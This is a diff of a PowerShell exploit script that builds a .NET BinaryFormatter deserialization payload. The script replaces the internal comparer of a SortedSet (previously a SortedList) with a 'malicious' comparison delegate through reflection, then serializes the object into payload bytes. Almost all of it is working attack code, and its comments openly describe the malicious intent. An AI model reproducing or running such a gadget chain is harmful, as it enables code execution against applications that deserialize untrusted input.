@@ -21,25 +21,31 @@ $comparisonDelegateType = [System.Comparison[string]]
 $constructor = $comparisonComparerType.GetConstructor([Type[]]@($comparisonDelegateType))
 $maliciousComparer = $constructor.Invoke(@($maliciousDelegate))
 
-# 5. Create a SortedList and populate it with our target URL and dummy data
-# We use the default comparer initially to avoid triggering the payload locally.
-$sortedList = New-Object System.Collections.Generic.SortedList[string, string] ([System.Collections.Generic.Comparer[string]]::Default)
-$sortedList.Add($targetUrl, $dummyData)
-$sortedList.Add("http://dummy.com", "dummy") # Add a second item to force a comparison during deserialization
+# 5. Create a SortedSet and populate it with dummy data
+$sortedSet = [System.Collections.Generic.SortedSet[string]]::new([System.Collections.Generic.Comparer[string]]::Default)
+$sortedSet.Add("http://dummy1.com") | Out-Null
+$sortedSet.Add("http://dummy2.com") | Out-Null
 
-# 6. Swap the internal comparer with our malicious one
-$comparerField = $sortedList.GetType().GetField('comparer', [System.Reflection.BindingFlags]'NonPublic, Instance')
+# 6. Dynamically find the internal comparer field using Reflection
+$fields = $sortedSet.GetType().GetFields([System.Reflection.BindingFlags]'NonPublic, Instance')
+$comparerField = $fields | Where-Object { $_.FieldType -eq [System.Collections.Generic.IComparer[string]] } | Select-Object -First 1
+
 if (-not $comparerField) {
-    $comparerField = $sortedList.GetType().GetField('_comparer', [System.Reflection.BindingFlags]'NonPublic, Instance')
+    Write-Host "[-] Could not find the comparer field dynamically. Aborting." -ForegroundColor Red
+    exit
+} else {
+    Write-Host "[+] Found comparer field: '$($comparerField.Name)'" -ForegroundColor Green
 }
-$comparerField.SetValue($sortedList, $maliciousComparer)
+
+# 7. Swap the internal comparer with our malicious one
+$comparerField.SetValue($sortedSet, $maliciousComparer)
 
 # --- Serialization ---
 Write-Host "[*] Serializing object..." -ForegroundColor Cyan
 try {
     $formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
     $ms = New-Object System.IO.MemoryStream
-    $formatter.Serialize($ms, $sortedList)
+    $formatter.Serialize($ms, $sortedSet)
     
     $payload = $ms.ToArray()
     if ($payload.Length -eq 0) { throw "Serialization returned empty." }
